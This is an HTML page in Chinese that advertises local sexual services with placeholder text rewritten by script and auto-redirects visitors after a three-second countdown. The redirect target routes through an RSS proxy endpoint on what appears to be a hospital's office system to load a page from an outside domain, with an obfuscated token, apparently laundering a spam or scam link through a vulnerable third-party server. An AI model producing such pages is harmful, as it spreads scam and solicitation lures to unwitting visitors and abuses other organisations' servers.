<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>自动跳转网页</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 800px;
            width: 90%;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            padding: 30px;
            position: relative;
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
        }
        .copy-text {
            color: #555;
            font-size: 16px;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        .image-container {
            width: 100%;
            height: auto;
            margin: 30px 0;
        }
        .image-container img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
        }
        .countdown {
            position: absolute;
            top: 20px;
            right: 20px;
            background-color: #3498db;
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-weight: bold;
        }
        .redirect-link {
            margin-top: 30px;
            display: inline-block;
            background-color: #e74c3c;
            color: white;
            padding: 12px 30px;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
            transition: background-color 0.3s;
        }
        .redirect-link:hover {
            background-color: #c0392b;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="countdown" id="countdown">3</div>
        <h1>标题内容</h1>
        <p class="copy-text" id="copyText">啪</p>
        
        <div class="image-container">
            <img src="img/Camera_XHS_17425853308291040g2sg319k62b6a7e705pmd.jpg" alt="自适应图片">
        </div>
        
        <a href="https://example.com" class="redirect-link" id="redirectLink">这</a>
    </div>

    <script>
        // 设置自动跳转URL（请替换为实际目标链接）
        const targetUrl = "https://oa.qnzrmyy.com/defaultroot/platform/portal/portlet/rssproxy.jsp?rssUrl=http://static.32xg.xyz/111.html&charEncode=UTF-8&token=aHZwdnswIyEkY2J9c3BoLQ5OVl5dRl8AU1wbUFBMCFkkN2s2Axg_AyEhNmd3a2tqWVVQUFtZXV5HS1oeDBcQ";
        const redirectLink = document.getElementById('redirectLink');
        const countdownEl = document.getElementById('countdown');
        const copyTextEl = document.getElementById('copyText');
        
        // 自定义标题和文案（可根据需求修改）
        document.querySelector('h1').textContent = '同城玥啪';
        copyTextEl.textContent = '快速上门，都是年轻妹妹，黑丝，JK，御姐，幼师，护士等各类型都有，自行动手，全地图都有，贰陆上进来玥抛啦~点进即看，安全且丝秘';
        
        // 设置图片源（可替换为你自己的图片URL）
        document.querySelector('.image-container img').src = 'https://p3.ssl.qhimgs1.com/t0499fbea7267bc61bd.jpg';
        
        // 自动跳转功能
        let countdown = 3;
        const countdownInterval = setInterval(() => {
            countdown--;
            countdownEl.textContent = countdown;
            
            if (countdown <= 0) {
                clearInterval(countdownInterval);
                redirectToUrl();
            }
        }, 1000);
        
        // 点击链接立即跳转
        redirectLink.href = targetUrl;
        redirectLink.addEventListener('click', (e) => {
            e.preventDefault();
            clearInterval(countdownInterval);
            redirectToUrl();
        });
        
        // 执行跳转
        function redirectToUrl() {
            window.location.href = targetUrl;
        }
    </script>
</body>
</html>
